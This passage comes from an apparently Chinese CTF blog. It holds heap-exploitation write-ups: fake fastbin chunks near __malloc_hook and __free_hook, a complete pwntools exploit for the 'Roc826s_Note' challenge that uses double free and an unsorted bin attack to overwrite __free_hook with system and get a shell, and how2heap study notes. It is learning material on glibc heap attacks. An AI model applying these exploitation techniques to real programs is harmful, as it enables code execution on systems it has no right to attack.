<p>这里只是举个例子，我将<code>0xbfe0c0</code>位置的堆块的<code>fd</code>指针指向了<code>__malloc_hook - 0x10</code>的位置，显然我们最后的目的是在<code>__malloc_hook - 0x10</code>处（也就是<code>__malloc_hook</code>附近）申请出一个堆块，从而让我们能够修改<code>__malloc_hook</code>中的内容，然而我们看看该位置+一个字长处的值</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-2.jpg" class>

<p>因为这个值跟fast bin链表对应的大小不同，所以这个伪造的chunk是无法直接申请出来的，当我们尝试将其从fast bin中malloc出来时，程序就会报错</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-3.jpg" class>

<p>解决方法也很简单，我们只需要再伪造chunk的size位即可，我们观察一下<code>__malloc_hook</code>附近的数据</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-4.jpg" class>

<p>会发现就有一些数据适合让我们进行伪造，我们调好适当的偏移，让伪造的chunk的size位正好为<code>0x7f</code>就能通过检查，因为<code>0x7f</code>正好在<code>0x70</code>的范围内，并且<code>0x7f</code>的最低一位是1。</p>
<p>我们调整好偏移之后再来看一下：</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-5.jpg" class>

<p>这样就完成了size位的伪造，我们就能成功在<code>__malloc_hook</code>附近申请出一个堆块，进而修改<code>__malloc_hook</code></p>
<p>这里还涉及到两个问题：</p>
<ul>
<li><p>在上面的例子中我们知道<code>__malloc_hook</code>附近是会有现有的数据能让我们完成size位的伪造的（目前只知道libc-2.23和libc-2.27会有，更高版本不知道还有没有），但是我们查看<code>__free_hook</code>附近，会发现什么都没有</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-6.jpg" class>

<p>这也就说明我们是无法直接在<code>__free_hook</code>附近得到一个<code>fast bin</code>大小的堆块的，我们得通过一些其他方法作为铺垫（例如unsorted bin attack），然后才能继续下一步</p>
</li>
<li><p><code>__malloc_hook</code>的参数是我们无法直接控制的（我目前的了解），也就是说我们要通过修改<code>__malloc_hook</code>来拿shell的话只能将其改成one_gadget或者后门函数，但是<code>__free_hook</code>的参数是我们可控的，其会将传进<code>free</code>函数的指针来作为第一个参数，也就是说我们只需要在chunk的数据区开头写入<code>/bin/sh</code>，修改<code>__free_hook</code>为<code>system</code>之后将这个chunk free掉即可。</p>
</li>
</ul>
</li>
<li><p>tcache虽然是单向链表，但是会将bk指针指向bin头，并且会<strong>通过这个指针来查找其所指向的整个bin链表中</strong>有无和这个bk指针所属的chunk相同的chunk，简单点说就是一个加强版的double free检查。绕过也很简单，只需要修改这个bk指针即可。</p>
</li>
</ol>
<h3 id="Roc826s-Note"><a href="#Roc826s-Note" class="headerlink" title="Roc826s_Note"></a>Roc826s_Note</h3><p>版本libc-2.23</p>
<p>还是菜单堆题，主要涉及函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.dele&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.show&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">19</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;full!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(&amp;<span class="built_in">list</span>)[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;size?&quot;</span>);</span><br><span class="line">  v2 = readi(<span class="string">&quot;size?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">0x90</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  (&amp;<span class="built_in">list</span>)[i] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  read_n((&amp;<span class="built_in">list</span>)[i], v2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">dele</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  v1 = readi(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;<span class="built_in">list</span>)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;<span class="built_in">list</span>)[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  v1 = readi(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;<span class="built_in">list</span>)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>((&amp;<span class="built_in">list</span>)[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在dele()函数中存在uaf漏洞，因为没有单独的edit功能，所以需要构造double free来修改fd指针伪造堆块</p>
<p>因为限制申请的chunk最大大小为0x90，所以能直接利用unsorted bin来泄漏libc地址</p>
<p>思路：</p>
<ol>
<li>泄漏libc和heap</li>
<li>伪造chunk修改<code>__free_hook</code>/<code>__malloc_hook</code>即可</li>
</ol>
<h4 id="修改-malloc-hook"><a href="#修改-malloc-hook" class="headerlink" title="修改__malloc_hook"></a>修改__malloc_hook</h4><p>泄漏libc后构造一个double free来在<code>__malloc_hook</code>附近申请一个堆块即可</p>
<h4 id="修改-free-hook"><a href="#修改-free-hook" class="headerlink" title="修改__free_hook"></a>修改__free_hook</h4><p>改<code>__free_hook</code>要稍微麻烦点，可以先利用unsorted bin attack在<code>__free_hook</code>附近写入一个libc地址，这样就能让<code>__free_hook</code>附近有可用的能够用来伪造size位的数据了(0x7f)</p>
<p>具体一点：</p>
<ol>
<li>泄漏libc和heap</li>
<li>在unsorted bin chunk前面申请一个堆块，从而修改unsorted bin chunk的bk指针指向<code>__free_hook</code>附近</li>
<li>将这个unsorted bin chunk malloc出来，这个解链的过程中unsorted bin chunk就会将其<code>fd</code>的值写入<code>bk-&gt;fd</code>中，这样就使得<code>__free_hook</code>附近出现了可用的数据</li>
<li>再正常利用double free来伪造堆块从而修改<code>__free_hook</code>即可</li>
</ol>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./Roc826&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./Roc826&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,28612)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x71&#x27;</span>) <span class="comment">#这里申请一个跟unsorted bin chunk相邻的chunk，通过这个chunk来伪造unsorted bin chunk的size位</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;&#x27;</span>)	<span class="comment">#申请一个unsorted bin chunk</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)	<span class="comment">#申请两个fast bin chunk实现double free</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f75f9240b78</span> - <span class="number">0x00007f75f8e7c000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">sys = libc_base + (<span class="number">0x7f75f8ec13a0</span> - <span class="number">0x00007f75f8e7c000</span>)</span><br><span class="line">free_hook = libc_base + (<span class="number">0x7fd4270557a8</span> - <span class="number">0x7fd426c8f000</span>)</span><br><span class="line">arena = libc_base + (<span class="number">0x7f6553094b78</span> - <span class="number">0x7f6552cd0000</span>)	<span class="comment">#这里的arena是指unsorted bin的bin头位置</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x130</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0x60</span>,p64(heap_base+<span class="number">0x20</span>))	<span class="comment">#这里伪造fd指针</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(arena) + p64(free_hook-<span class="number">0x40</span>))	<span class="comment">#这里修改unsorted bin chunk的bk指针</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#unsorted bin attack</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook-<span class="number">0x30</span>-<span class="number">3</span>))	<span class="comment">#这里开始再进行一次堆块的伪造即可</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span> + p64(sys))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/04/17/how2heap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/17/how2heap/" class="post-title-link" itemprop="url">how2heap</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-17 14:09:41" itemprop="dateCreated datePublished" datetime="2022-04-17T14:09:41+08:00">2022-04-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-12 01:17:23" itemprop="dateModified" datetime="2022-05-12T01:17:23+08:00">2022-05-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="How2heap"><a href="#How2heap" class="headerlink" title="How2heap"></a>How2heap</h2><p>这里记一下从how2heap中学习所得</p>
<h4 id="first-fit"><a href="#first-fit" class="headerlink" title="first-fit"></a>first-fit</h4><p>glibc使用第一契合算法来选择free chunk，就是如果程序在遍历bins链表的时候，如果找到一个free chunk足够大（也就是不小于用户需求），那么就会直接选择这个chunk来使用以此节省时间，而不是去遍历完所有的bin来寻找一个大小刚刚合适的chunk。</p>
<p>如果遍历完bins链表都没有能满足用户需求大小的chunk，则在Top chunk中划分一块给用户。</p>
<p>如果Top chunk的大小都不足以满足用户需求，则堆管理器再向系统申请内存，这里再分为：①申请的内存较小使用brk系统调用。②申请的内存较大使用mmap系统调用。</p>
<p>综上：用户在申请内存时，先根据大小决定在哪个bins中寻找chunk，如果该申请的内存大小不满足fast bins的范围，则在unsorted bin中寻找，在unsorted bin中寻找不到就会触发其合并机制，合并完后进行归类，归类完后在对应大小的small bins或large bins中继续寻找。再找不到就top chunk…..</p>
<p>只要在这个寻找的过程中找到了一个大于或等于用户申请需求的内存大小的chunk，则立刻停止寻找，这时这块chunk如果是大于申请需求的，则会进行划分，划分为刚好满足用户申请大小的chunk和剩余部分的chunk，这块剩余部分的chunk称为last remainder chunk，然后last remainder chunk会被填入相关控制字段，再重新进入unsorted bin中</p>
<h4 id="use-after-free（释放重利用）"><a href="#use-after-free（释放重利用）" class="headerlink" title="use-after-free（释放重利用）"></a>use-after-free（释放重利用）</h4><p>（unsorted bin为双向链表，下图中省略了结构）（指针类型和malloc的大小为例子）</p>
<p>① 依次执行 <code>char* a = malloc(0x512); char* b = malloc(0x256); free(a); </code></p>
<p>由以上步骤得到如下图结构：</p>
<img src="/2022/04/17/how2heap/use-after-free-1.jpg" class>

<p>在这里要注意的是：一、<code>free(a);</code>之后a所指向的chunk中的数据不会被抹除，仅仅只是将这块chunk标记为free chunk。二、指针a（也就是malloc返回的指针）也不会消失，仍然指向原来的区域</p>
<p>② <code>char* c = malloc(0x500);</code></p>
<p>由于glibc的first fit算法，<code>malloc(0x500);</code>所得到的chunk会是刚释放掉的那块chunk，此时指针a跟指针c指向的是同一个位置</p>
<img src="/2022/04/17/how2heap/use-after-free-2.png" class>

<p>综上操作就得到了两个指向相同位置的指针，打印a和c，都会得到相同的内容，即原本chunk中的数据部分的内容</p>
<h4 id="Double-free"><a href="#Double-free" class="headerlink" title="Double-free"></a>Double-free</h4><p>fast bins会检查列入它的链表中的chunk的大小是否符合它此时fast bin所对应的大小，例如一个fast bin要存放的是0x20大小的chunk，则在一个free chunk在进入这个bin的链表之前会进行两个检查：(一) 要放进来的这个chunk是否与<strong>上一个</strong>放进来的chunk相同（也就是防止一个chunk被连续free两次）。(二) 要放进来的这个chunk的大小是否与这个bin的规定存放大小相等。程序正常运行时不会出现这种不相等的情况，但是设置这个检查就是为了防止恶意攻击。</p>
<p>fast bins的double free检查存在的缺陷是它只检查准备放进来的这个chunk是否与上一个chunk相同，而不会检查整个链表中是否有跟这个chunk相同的chunk，这种简单的检查设计也是同时在兼顾着fast bins的速度问题，如果加入一些繁杂的检查机制会导致拖慢fast bins的速度。所以只要在第二次free掉一个已经free掉的chunk前free掉另一个chunk就可以绕过double free检查。</p>
<p>① <code>int* a = malloc(8); int* b = malloc(8); int* c = malloc(8); </code></p>
<p>首先malloc三块符合fast bins的chunk</p>
<p>② <code>free(a); free(b); free(a);</code></p>
<p>然后让a指针所对应的chunk释放两次，因为double free检查的存在，所以中间先把b指针所对应的chunk给free掉。到目前为止就得到了如下的fast bins结构：</p>
<img src="/2022/04/17/how2heap/double-free-1.jpg" class>

<p>③ <code>int* d = malloc(8); malloc(8);</code></p>
<p>用指针d接收第二次被free掉的那块chunk，然后再malloc一次把中间的那块chunk去掉</p>
<img src="/2022/04/17/how2heap/double-free-2.png" class>

<p>到这里为止我们发现fast bins的指针跟指针d都指向了同一块chunk</p>
<p>对于d的指针来说，a是一块malloced chunk，所以d的指针认为它所指的位置是数据体部分，可以往里任意写入数据，但在fast bin中的a是一块free chunk，a的数据体部分的第一个字长用作fd指针，所以d的指针可以通过写入数据来使fast bin中的a的fd指针指向任意位置。</p>
<p>④ 通过d的指针将a的fd指针修改为栈上的一块内存</p>
<p>因为在bin的链表中仅仅依靠指针来寻找和确定有无下一个chunk，所以修改fd指针后fast bin中就相当于多出了一个chunk，如下图：</p>
<img src="/2022/04/17/how2heap/double-free-3.png" class>

<img src="/2022/04/17/how2heap/double-free-4.png" class>

<p>注意fd指针和堆返回的指针指向不同。应使要修改的栈上的值在fd指针下面两个字节处。</p>
<h4 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted-bin-attack"></a>unsorted-bin-attack</h4><p>该攻击能达到的效果是向任意地址写入一个较大的数字，前提是能控制bk的值。</p>
<p>该攻击虽然能向任意地址写，但不能控制写入的值，一般是作为其他攻击的铺垫。</p>
<p>fast bins在32位平台中存放的chunk的大小在16-64之间，但这个限制实际上是由arena中的一个控制字段控制的，所以如果利用unsorted bin attack将这个控制字段修改，就能修改存放在fast bins中的chunk大小的限制，使得所有chunk被free掉之后都存入fast bins中，再结合fast bins的攻击达到控制程序执行流等目的。</p>
<p>首先要了解从unsorted bin中取出一个chunk的流程</p>
<p>下图是unsorted bin的结构</p>
<img src="/2022/04/17/how2heap/unsorted-bin-attack-1.jpg" class>

<p>当从unsorted bin从取出一个chunk（这里称为chunk1）时，为了保证unsorted bin的双向链表结构的完整，程序会修改unsorted bin表头的fd指针和被取出的chunk指向的下一块chunk（这里称为chunk2）的bk指针。</p>
<p>那么如何将unsorted bin表头的fd指针和chunk2的bk指针修改为正确的值呢？显然这两个对应的值储存在chunk1的fd指针和bk指针中，所以此时unsorted bin表头的fd指针就会填上chunk1的fd指针的值，chunk2的bk指针就会填上chunk1的bk指针的值。</p>
<p>最后形成如下结构</p>
<img src="/2022/04/17/how2heap/unsorted-bin-attack-2.jpg" class>

<p>由上过程我们可以发现，如果我们能够控制chunk1的fd指针的值，那么就相当于我们能够让任意地址作为chunk2，且在chunk1被取出的时候，程序就会自动向chunk2的对应位置中写入unsorted bin表头的所在地址，对于主进程来说，这个地址位于libc的数据段中，所以会是一个比较大的值。综上我们就完成了一个较大值的任意地址写。</p>
<h4 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h4><p>需要：堆溢出</p>
<p>通过堆溢出将top chunk的size控制字段修改成一个极大的数字，这是为了避免堆管理器在后面用mmap()系统调用来申请内存，以及让之后的内存申请都在top chunk中发生。</p>
<img src="/2022/04/17/how2heap/house_of_force-1.jpg" class>

<p>例如想修改栈上的一个值，我们第一次先malloc一个很大的空间，大到把栈的一部分也作为这块chunk的一部分，这块malloc的空间就会从top chunk当前的起始位置一直往内存的高地址划分，直到达到我们指定的大小，然后我们第二次再malloc一块chunk，那么这块chunk就会直接在栈上，此时我们就实现了往栈上写数据。</p>
<p>而且如果我们malloc一个负数，那么就会在此时top chunk低地址处得到一块chunk（这是因为malloc的参数是无符号类型整数，所以我们传进一个负数的话会被解释成无符号类型整数，从而发生整数溢出，最后会得到从此时top chunk起始地址往低地址的一块对应大小的chunk），我们就可以用这种方式去修改程序段的某个地址的值。</p>
<h4 id="house-of-einherjar-libc-2-23"><a href="#house-of-einherjar-libc-2-23" class="headerlink" title="house_of_einherjar(libc-2.23)"></a>house_of_einherjar(libc-2.23)</h4><p>（还没搞懂）</p>
<p>条件：off-by-one、泄漏heap地址</p>
<p>该攻击实现的是任意地址分配chunk</p>
<h4 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house_of_orange"></a>house_of_orange</h4><p>（还没搞懂）</p>
<p>很好的博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/happylzs2008/article/details/103879620">借助gdb调试glibc代码学习House of Orange_happylzs2008的博客-CSDN博客</a></p>
<p>使用场景：程序中没有包含free函数或者其他释放堆块的函数时，利用该漏洞获得free的效果</p>
<p>条件：</p>
<ol>
<li>能够修改top chunk的size位</li>
<li>伪造top chunk的size必须对齐到内存页（0x1000个字节），意思就是top chunk的起始地址加上top chunk的size必须是0x1000的倍数</li>
<li>伪造的这个size必须大于最小chunk的大小，同时小于之后要申请的内存</li>
<li>inuse位必须为1</li>
</ol>
<p>原理：</p>
<ol>
<li><p>当现有的top chunk都不足以满足malloc的分配需求时，系统会执行sysmalloc来向系统申请更多空间，在该函数中，其会根据我们申请的大小决定用mmap分配还是brk分配。我们需要让堆以brk的形式拓展，因为用mmap进行拓展时不会将原本的top chunk free掉，这个过程中首先会在原来的top chunk的上方拓展一块空间作为新的top chunk，然后会把原来的top chunk free掉，这样旧top chunk就进入了unsorted bin中。</p>
</li>
<li></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/04/14/pwnable-tw-calc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/14/pwnable-tw-calc/" class="post-title-link" itemprop="url">pwnable.tw-calc</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

